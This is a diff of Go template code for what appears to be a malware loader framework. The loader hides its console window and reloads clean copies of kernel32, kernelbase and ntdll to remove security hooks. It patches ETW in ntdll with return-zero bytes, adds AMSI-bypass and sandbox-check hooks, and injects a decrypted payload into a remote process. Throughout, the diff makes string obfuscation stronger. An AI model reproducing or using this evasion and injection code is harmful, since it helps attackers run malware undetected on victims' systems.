-	return {{.Variables.src}}[:({{.Variables.length}} - {{.Variables.unpadding}} )]
-}
-
 
 func {{.Variables.Console}}(show bool) {
-	{{.Variables.getWin}} := syscall.NewLazyDLL("kernel32.dll").NewProc("GetConsoleWindow")
-	{{.Variables.showWin}} := syscall.NewLazyDLL("user32.dll").NewProc("ShowWindow")
+	{{.Variables.getWin}} := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc({{.Variables.decode}}("{{.Variables.GetConsoleWindowName}}"))
+	{{.Variables.showWin}} := syscall.NewLazyDLL(string([]byte{'u', 's', 'e', 'r', '3', '2',})).NewProc({{.Variables.decode}}("{{.Variables.ShowWindowName}}"))
 	{{.Variables.hwnd}}, _, _ := {{.Variables.getWin}}.Call()
-	if {{.Variables.hwnd}} == 0 {
-			return
-	}
-	if show {
-	   var {{.Variables.SW_RESTORE}} uintptr = 9
-	   {{.Variables.showWin}}.Call({{.Variables.hwnd}}, {{.Variables.SW_RESTORE}})
-	} else {
-	   var {{.Variables.SW_HIDE}} uintptr = 0
-	   {{.Variables.showWin}}.Call({{.Variables.hwnd}}, {{.Variables.SW_HIDE}})
-	}
+	var {{.Variables.SW_HIDE}} uintptr = 0
+	{{.Variables.showWin}}.Call({{.Variables.hwnd}}, {{.Variables.SW_HIDE}})
 }
 
 func {{.Variables.Versionfunc}}() string {
@@ -1651,30 +1388,23 @@ func {{.Variables.Versionfunc}}() string {
 }
 
 
-func {{.Variables.decode}}({{.Variables.b64}} string,) string {
-	var {{.Variables.decoded}} []byte
-		{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString({{.Variables.b64}})
-	{{.Variables.sum}} := 1
-	for i := 1; i < {{.Variables.number}}; i++ {
-		{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString(string({{.Variables.decoded}}))
-		{{.Variables.sum}} += i
-	}
-	return string({{.Variables.decoded}})
 
-}
+{{.Variables.WriteProcessMemory_Function}}
 
 {{.Variables.ETW_Function}}
 
+{{.Variables.AMSI_Function}}
+
 func {{.Variables.loader}}()  {
-	err := {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.kernel32}}"))
+	err := {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}))
 	if err != nil {
 		{{.Variables.RefreshPE}}
 	}
-	err = {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.kernelbase}}"))
+	err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'r', '.', 'd', 'l', 'l'}))
 	if err != nil {
 		{{.Variables.RefreshPE}}
 	}
-	err = {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.ntdll}}"))
+	err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
 	if err != nil {
 		{{.Variables.RefreshPE}}
 	}
@@ -1746,35 +1476,13 @@ func main() {
 	{{.Variables.Sandbox}}
 	{{.Variables.ETW}}
 	{{.Variables.hide}}
+	{{.Variables.AMSI}}
 	{{.Variables.Version}} := {{.Variables.Versionfunc}}()
 	if {{.Variables.Version}} == "10.0" {
 		{{.Variables.loader}}()
 	}
 	{{.Variables.ETW}}
-
-	{{.Variables.ciphertext}}
-	{{.Variables.vciphertext}}, _ := base64.StdEncoding.DecodeString({{.Variables.fullciphertext}})
-	{{.Variables.vkey}}, _ := base64.StdEncoding.DecodeString("{{.Variables.key}}")
-	{{.Variables.viv}}, _ := base64.StdEncoding.DecodeString("{{.Variables.iv}}")
-
-	{{.Variables.block}}, err := aes.NewCipher({{.Variables.vkey}})
-	if err != nil {
-		return
-	}
-
-
-	if len({{.Variables.vciphertext}}) < aes.BlockSize {
-		return
-	}
-
-	{{.Variables.decrypted}} := make([]byte, len({{.Variables.vciphertext}}))
-	{{.Variables.mode}} := cipher.NewCBCDecrypter({{.Variables.block}}, {{.Variables.viv}})
-	{{.Variables.mode}}.CryptBlocks({{.Variables.decrypted}}, {{.Variables.vciphertext}})
-	{{.Variables.stuff}} := {{.Variables.PKCS5UnPadding}}({{.Variables.decrypted}})
-
-	{{.Variables.rawdata}} := (string({{.Variables.stuff}}))
-	{{.Variables.hexdata}}, _ := base64.StdEncoding.DecodeString({{.Variables.rawdata}})
-	{{.Variables.raw_bin}}, _ := hex.DecodeString(string({{.Variables.hexdata}}))
+	{{.Variables.raw_bin}} := [loader].{{.Variables.FuncName}}()
 	{{.Variables.ReloadRemoteProcess}}({{.Variables.raw_bin}})
 }
 
@@ -1797,11 +1505,10 @@ func {{.Variables.RemoteModuleReloading}}({{.Variables.name}} string, {{.Variabl
 	{{.Variables.regionsize}} := len({{.Variables.bytes}})
 	{{.Variables.offsetaddr}} := uintptr({{.Variables.dllOffset}})
 	var {{.Variables.nLength}} uintptr
-	{{.Variables.WriteProcessMemory}}({{.Variables.handle}}, {{.Variables.offsetaddr}}, uintptr(unsafe.Pointer(&{{.Variables.data}}[0])), uintptr(uint32({{.Variables.regionsize}})), &{{.Variables.nLength}})
+	{{.Variables.WriteProcessMemory}}(uintptr({{.Variables.handle}}), {{.Variables.offsetaddr}}, &{{.Variables.data}}[0], uintptr(uint32({{.Variables.regionsize}})), &{{.Variables.nLength}})
 
 	return nil
 }
-
 
 
 func {{.Variables.Reloading}}({{.Variables.DLLname}} string) error {
@@ -1814,7 +1521,7 @@ func {{.Variables.Reloading}}({{.Variables.DLLname}} string) error {
 	if {{.Variables.error}} != nil {
 		return {{.Variables.error}}
 	}
-	{{.Variables.x}} := {{.Variables.file}}.Section(".text")
+	{{.Variables.x}} := {{.Variables.file}}.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
 	{{.Variables.bytes}} := {{.Variables.dll}}[{{.Variables.x}}.Offset:{{.Variables.x}}.Size]
 	{{.Variables.loaddll}}, {{.Variables.error}} := windows.LoadDLL({{.Variables.DLLname}})
 	if {{.Variables.error}} != nil {
@@ -1823,53 +1530,30 @@ func {{.Variables.Reloading}}({{.Variables.DLLname}} string) error {
 	{{.Variables.handle}} := {{.Variables.loaddll}}.Handle
 	{{.Variables.dllBase}} := uintptr({{.Variables.handle}})
 	{{.Variables.dllOffset}} := uint({{.Variables.dllBase}}) + uint({{.Variables.x}}.VirtualAddress)
-	var {{.Variables.oldfartcodeperms}} uintptr
-	{{.Variables.regionsize}} := uintptr(len({{.Variables.bytes}}))
 	{{.Variables.handlez}} := uintptr(0xffffffffffffffff)
-	{{.Variables.runfunc}}, _ := [NtProtectVirtualMemory](
-		{{.Variables.customsyscall}}, 
-		{{.Variables.handlez}},
-		(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
-		&{{.Variables.regionsize}},
-		syscall.PAGE_EXECUTE_READWRITE,
-		&{{.Variables.oldfartcodeperms}},
-	)
-	if {{.Variables.runfunc}} != 0 {
+	var {{.Variables.oldfartcodeperms}} uintptr
 
-	}
-
-
-	for i := 0; i < len({{.Variables.bytes}}); i++ {
-		{{.Variables.loc}} := uintptr({{.Variables.dllOffset}} + uint(i))
-		{{.Variables.mem}} := (*[1]byte)(unsafe.Pointer({{.Variables.loc}}))
-		(*{{.Variables.mem}})[0] = {{.Variables.bytes}}[i]
-	}
-
-	{{.Variables.runfunc}}, _ = [NtProtectVirtualMemory](
-		{{.Variables.customsyscall}}, 
-		{{.Variables.handlez}},
-		(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
-		&{{.Variables.regionsize}},
-		{{.Variables.oldfartcodeperms}},
-		&{{.Variables.oldfartcodeperms}},
-	)
-	if {{.Variables.runfunc}} != 0 {
-	}
+	{{.Variables.WriteProcessMemory}}({{.Variables.handlez}}, uintptr({{.Variables.dllOffset}}), (&{{.Variables.bytes}}[0]), uintptr(uint32(len({{.Variables.bytes}}))), & {{.Variables.oldfartcodeperms}})
 
 	return nil
-}
-func [NtProtectVirtualMemory]({{.Variables.sysid}} uint16, {{.Variables.processHandle}} uintptr, {{.Variables.baseAddress}}, {{.Variables.regionSize}} *uintptr, {{.Variables.NewProtect}} uintptr, {{.Variables.oldprotect}} *uintptr) (uint32, error) {
-
-	return [loader].[NtProtectVirtualMemory](
-		{{.Variables.sysid}},
-		{{.Variables.processHandle}},
-		uintptr(unsafe.Pointer({{.Variables.baseAddress}})),
-		uintptr(unsafe.Pointer({{.Variables.regionSize}})),
-		{{.Variables.NewProtect}},
-		uintptr(unsafe.Pointer({{.Variables.oldprotect}})),
-	)
 }
 	
 	
 	`
+}
+
+func ETWInjectionSection() string {
+	return `
+	if {{.Variables.name}} == "C:\\Windows\\System32\\ntdll.dll" {
+		{{.Variables.offset}} := []uint32{0x4E1A0, 0x4E100, 0x41E70, 0x42030}
+		for i, _ := range {{.Variables.offset}} {
+			{{.Variables.data}}, _ := hex.DecodeString("4833C0C3")
+			var {{.Variables.nLength}} uintptr
+			{{.Variables.datalength}} := len({{.Variables.data}})
+			{{.Variables.WriteProcessMemory}}({{.Variables.handle}}, uintptr(uint({{.Variables.dllOffset}} ))+uintptr(uint({{.Variables.offset}}[i])), uintptr(unsafe.Pointer(&{{.Variables.data}}[0])), uintptr(uint32({{.Variables.datalength}} )), &{{.Variables.nLength}})
+		}
+	} else {
+
+	}
+`
 }
